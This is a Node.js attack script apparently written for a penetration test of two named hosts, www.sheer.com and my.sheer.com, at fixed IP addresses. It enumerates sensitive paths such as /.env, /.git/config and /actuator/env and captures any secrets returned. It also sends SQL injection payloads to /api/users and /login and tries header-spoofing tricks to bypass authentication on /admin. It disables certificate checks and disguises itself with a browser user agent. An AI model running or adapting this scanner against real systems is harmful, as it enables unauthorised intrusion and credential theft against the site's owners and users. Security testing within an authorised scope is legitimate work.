import https from 'https';
import dns from 'dns';

const TARGETS = [
  { host: 'www.sheer.com', ip: '185.120.70.196' },
  { host: 'my.sheer.com', ip: '185.120.70.212' }
];

const ENDPOINTS = [
  '/',
  '/robots.txt',
  '/sitemap.xml',
  '/.well-known/security.txt',
  '/admin',
  '/administrator',
  '/login',
  '/dashboard',
  '/console',
  '/manager',
  '/api',
  '/api/v1',
  '/api/users',
  '/graphql',
  '/swagger',
  '/swagger-ui',
  '/openapi.json',
  '/.git/HEAD',
  '/.git/config',
  '/.env',
  '/config.json',
  '/backup/',
  '/server-status',
  '/actuator/health',
  '/actuator/env'
];

const SQLI_PAYLOADS = [
  "'",
  "' AND '1'='1",
  "' AND '1'='2",
  "' OR '1'='1",
  "admin'--",
  "1' UNION SELECT null--",
  "1' UNION SELECT null,null--"
];

const AUTH_BYPASS_HEADERS = {
  'X-Forwarded-For': '127.0.0.1',
  'X-Original-URL': '/admin',
  'X-Rewrite-URL': '/admin',
  'Referer': 'https://www.sheer.com/admin'
};

function request(host, ip, path, method = 'GET', headers = {}, body = null) {
  return new Promise((resolve, reject) => {
    const opts = {
      hostname: ip,
      port: 443,
      path,
      method,
      headers: {
        Host: host,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0 Safari/537.36',
        Accept: '*/*',
        Connection: 'close',
        ...headers
      },
      rejectUnauthorized: false,
      timeout: 10000
    };

    const req = https.request(opts, (res) => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => resolve({ status: res.statusCode, headers: res.headers, body: data }));
    });

    req.on('error', reject);
    req.on('timeout', () => { req.destroy(); reject(new Error('timeout')); });
    if (body) req.write(body);
    req.end();
  });
}

async function main() {
  const findings = [];

  for (const t of TARGETS) {
    console.log(`\n=== ${t.host} (${t.ip}) ===`);

    // DNS check
    try {
      const addrs = await dns.promises.resolve4(t.host);
      console.log('DNS resolves to:', addrs);
      if (!addrs.includes(t.ip)) {
        findings.push({ host: t.host, title: 'DNS mismatch vs scope', sev: 'info', evidence: `Resolved ${addrs.join(',')} but scope is ${t.ip}` });
      }
    } catch (e) {
      console.log('DNS resolution failed:', e.message);
    }

    // Endpoint discovery + secret exposure
    for (const path of ENDPOINTS) {
      try {
        const res = await request(t.host, t.ip, path);
        const snippet = res.body.slice(0, 512).replace(/\s+/g, ' ');
        console.log(`${path} -> ${res.status} (${res.body.length} bytes)`);

        if (path === '/.git/HEAD' && res.body.includes('ref:')) {
          findings.push({ host: t.host, title: 'Exposed .git repository', sev: 'high', evidence: `/.git/HEAD returned: ${snippet}` });
        }
        if (path === '/.env' && (res.body.includes('=') || res.body.includes('SECRET') || res.body.includes('DB_'))) {
          findings.push({ host: t.host, title: 'Exposed .env file', sev: 'crit', evidence: `/.env returned secrets: ${snippet}` });
        }
        if (path === '/config.json' && res.body.includes('{')) {
          findings.push({ host: t.host, title: 'Exposed config.json', sev: 'high', evidence: `/config.json returned: ${snippet}` });
        }
        if (path === '/backup/' && res.status === 200) {
          findings.push({ host: t.host, title: 'Directory listing on /backup/', sev: 'med', evidence: `/backup/ returned 200 with body: ${snippet}` });
        }
        if ((path === '/admin' || path === '/administrator' || path === '/dashboard') && res.status === 200 && res.body.length > 0) {
          findings.push({ host: t.host, title: `Potentially exposed admin interface at ${path}`, sev: 'high', evidence: `${path} returned 200 (${res.body.length} bytes)` });
        }
        if (path === '/swagger-ui' && res.status === 200) {
          findings.push({ host: t.host, title: 'Swagger UI exposed', sev: 'med', evidence: `/swagger-ui returned 200` });
        }
        if (path === '/openapi.json' && res.status === 200) {
          findings.push({ host: t.host, title: 'OpenAPI spec exposed', sev: 'low', evidence: `/openapi.json returned 200` });
        }
        if (path === '/server-status' && res.body.includes('Server Status')) {
          findings.push({ host: t.host, title: 'Apache server-status exposed', sev: 'med', evidence: `/server-status returned status page` });
        }
      } catch (e) {
        console.log(`${path} -> ERROR: ${e.message}`);
      }
    }

    // SQLi probes on /api/users (if parameter guessing possible) and /login
    // We'll probe via query string on /api/users?id= and body on /login
    const sqliTargets = [
      { path: '/api/users?id=1', method: 'GET' },
      { path: '/login', method: 'POST', body: (p) => `username=${encodeURIComponent(p)}&password=test` }
    ];

    for (const st of sqliTargets) {
      for (const payload of SQLI_PAYLOADS) {
        try {
          let body = null;
          let headers = {};
          if (st.method === 'POST') {
            body = st.body(payload);
            headers['Content-Type'] = 'application/x-www-form-urlencoded';
          } else {
            // already in path
          }
          const targetPath = st.method === 'GET' ? `${st.path}${payload}` : st.path;
          const res = await request(t.host, t.ip, targetPath, st.method, headers, body);
          const lower = res.body.toLowerCase();
          if (lower.includes('sql') || lower.includes('syntax') || lower.includes('mysql') || lower.includes('postgres') || lower.includes('odbc')) {
            findings.push({ host: t.host, title: `SQL injection suspected at ${st.path}`, sev: 'high', evidence: `Payload "${payload}" triggered SQL error: ${res.body.slice(0,200)}` });
          }
          // Time-based is harder without timing; skip for brevity
        } catch (e) {
          // ignore errors
        }
      }
    }

    // Auth bypass header tricks on /admin
    for (const [header, value] of Object.entries(AUTH_BYPASS_HEADERS)) {
      try {
        const res = await request(t.host, t.ip, '/admin', 'GET', { [header]: value });
        if (res.status === 200 && res.body.length > 100) {
          findings.push({ host: t.host, title: 'Potential auth bypass via header tampering', sev: 'high', evidence: `/admin returned 200 with header ${header}: ${value} (body ${res.body.length} bytes)` });
        }
      } catch (e) {
        // ignore
      }
    }
  }

  console.log('\n=== FINDINGS ===');
  console.log(JSON.stringify(findings, null, 2));
}

main().catch(console.error);
